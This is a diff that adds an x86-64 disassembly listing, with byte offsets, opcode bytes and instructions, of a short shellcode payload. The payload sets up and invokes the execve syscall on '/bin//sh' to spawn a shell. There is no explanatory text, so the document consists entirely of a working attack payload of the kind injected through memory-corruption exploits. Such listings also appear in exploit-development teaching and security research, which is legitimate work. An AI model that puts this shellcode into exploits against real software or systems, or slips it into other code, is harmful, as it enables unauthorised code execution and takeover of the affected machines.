@@ -1,0 +1,11 @@
+0:  48 31 c0                xor    rax,rax
+3:  48 83 c0 3b             add    rax,0x3b
+7:  48 31 ff                xor    rdi,rdi
+a:  57                      push   rdi
+b:  48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f2f6e69622f
+12: 2f 73 68
+15: 57                      push   rdi
+16: 48 8d 3c 24             lea    rdi,[rsp]
+1a: 48 31 f6                xor    rsi,rsi
+1d: 48 31 d2                xor    rdx,rdx
+20: 0f 05                   syscall
